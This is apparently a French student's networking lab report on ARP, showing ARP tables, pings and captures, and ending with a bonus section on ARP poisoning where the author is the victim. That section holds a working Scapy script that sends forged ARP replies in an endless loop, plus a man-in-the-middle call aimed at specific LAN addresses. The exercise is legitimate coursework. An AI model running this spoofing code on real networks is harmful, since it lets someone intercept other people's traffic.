# TP3 : 32°13'34"N 95°03'27"W

☀️ Avant de continuer...
```
> ip a
link/ether b8:1e:a4:6c:56:97 brd ff:ff:ff:ff:ff:ff
```
☀️ Affichez votre table ARP

```
arp -a
? (10.33.65.63) at 44:af:28:c3:6a:9f [ether] on wlp3s0
_gateway (10.33.79.254) at 7c:5a:1c:d3:d8:76 [ether] on wlp3s0
```

☀️ Déterminez l'adresse MAC de la passerelle du réseau de l'école

```
arp -a
? (10.33.65.63) at 44:af:28:c3:6a:9f [ether] on wlp3s0
```

☀️ Supprimez la ligne qui concerne la passerelle

```
> sudo arp -d 10.33.79.254
[sudo] password for effect: 
SIOCDARP(dontpub): Network is unreachable
```

☀️ Prouvez que vous avez supprimé la ligne dans la table ARP

```
> arp -a
(elle est vide)
```

☀️ Wireshark

La capture -> `arp1.pcapng`

# II. ARP dans un réseau local

### 1. Basics

☀️ Déterminer

Adresse IP : `192.168.11.211/24`

Adresse MAC : `b8:1e:a4:6c:56:97`

☀️ DIY

nouvelle adresse IP : `192.168.6.0/24`

```
> ip a
2: wlp3s0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether b8:1e:a4:6c:56:97 brd ff:ff:ff:ff:ff:ff
    inet 192.168.6.0/24 scope global wlp3s0
       valid_lft forever preferred_lft forever
    inet6 2a02:8440:6440:373b:99b8:5e2f:9265:4c53/64 scope global temporary dynamic 
       valid_lft 6894sec preferred_lft 6894sec
    inet6 2a02:8440:6440:373b:a671:31ee:6e09:f879/64 scope global dynamic mngtmpaddr noprefixroute 
       valid_lft 6894sec preferred_lft 6894sec
    inet6 fe80::aead:b484:22e8:76d1/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```

☀️ Pingz !

```
> ping 192.168.11.7
PING 192.168.11.7 (192.168.11.7) 56(84) bytes of data.
64 bytes from 192.168.11.7: icmp_seq=1 ttl=128 time=172 ms
64 bytes from 192.168.11.7: icmp_seq=2 ttl=128 time=5.49 ms
64 bytes from 192.168.11.7: icmp_seq=3 ttl=128 time=10.1 ms
64 bytes from 192.168.11.7: icmp_seq=4 ttl=128 time=11.4 ms
```

```
> ping 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=106 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=150 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=69.4 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=91.7 ms
```

### 2. ARP

☀️ Affichez votre table ARP !

```
> arp -a
? (192.168.11.7) at 34:c9:3d:22:97:2d [ether] on wlp3s0
? (192.168.11.30) at 14:5a:fc:7f:13:93 [ether] on wlp3s0
? (192.168.11.32) at 34:c9:3d:22:97:2d [ether] on wlp3s0
_gateway (192.168.11.46) at 96:24:c9:47:ee:dc [ether] on wlp3s0
? (192.168.11.47) at 58:cd:c9:60:e5:fb [ether] on wlp3s0
```

```
> arp -a
(toute vide)
```

☀️ Capture arp2.pcap

La capture -> `arp2.pcapng`

### 3. Bonus : ARP poisoning

(Je suis la victime)

⭐ Empoisonner la table ARP de l'un des membres de votre réseau

Avec le script ci dessous l'attaquant à empoisonner les informations de ma table ARP. L'IP
qui est censé être celle du routeur est donc la sienne :

```
> ip n s
172.20.10.4 dev wlp3s0 lladdr 90:e8:68:15:ac:43 STALE 
172.20.10.1 dev wlp3s0 lladdr 90:e8:68:15:ac:43 REACHABLE 
fe80::60d0:39ff:fef1:3f64 dev wlp3s0 lladdr 62:d0:39:f1:3f:64 router STALE 
2a0d:e487:132f:e506:f40d:223a:e036:824e dev wlp3s0 lladdr 62:d0:39:f1:3f:64 router STALE 
```

```py
from scapy.all import ARP, Ether, sendp, conf, getmacbyip

def arp_poison(victim_ip, victim_mac, router_ip):
    # Get your own MAC address (attacker's MAC)
    attacker_mac = "b8:1e:a4:6c:56:97"
    
    # Create an Ethernet frame with the destination MAC as the victim's MAC
    ethernet = Ether(dst=victim_mac)
    
    # Create an ARP response saying that your MAC address (attacker_mac) is the router (router_ip)
    arp_response = ARP(pdst=victim_ip, hwdst=victim_mac, psrc=router_ip, hwsrc=attacker_mac, op='is-at')
    
    # Combine the Ethernet frame and the ARP response
    packet = ethernet / arp_response

    # Send the ARP response packet in a loop to keep poisoning the victim's ARP cache
    while True:
        sendp(packet, verbose=0)
```

⭐ Mettre en place un MITM

```py
target_ip = "192.168.11.7"  # IP of the victim
target_mac = "34-C9-3D-22-97-2D"  # MAC of the victim
spoof_ip = "192.168.11.46"  # IP you want to spoof (usually the gateway)

target_ip2 = "192.168.11.46"  # IP of the victim
target_mac2 = "96-24-c9-47-ee-dc"  # MAC of the victim
spoof_ip2 = "192.168.11.46"  # IP you want to spoof (usually the gateway)

arp_poison(target_ip, target_mac, spoof_ip)
arp_poison(target_ip2, target_mac2, spoof_ip2)
```

Il a pu dans ce cas là récupérer et voir mes requêtes vers les différents site web que je consultais.

## *Ecrit par eff4ctt*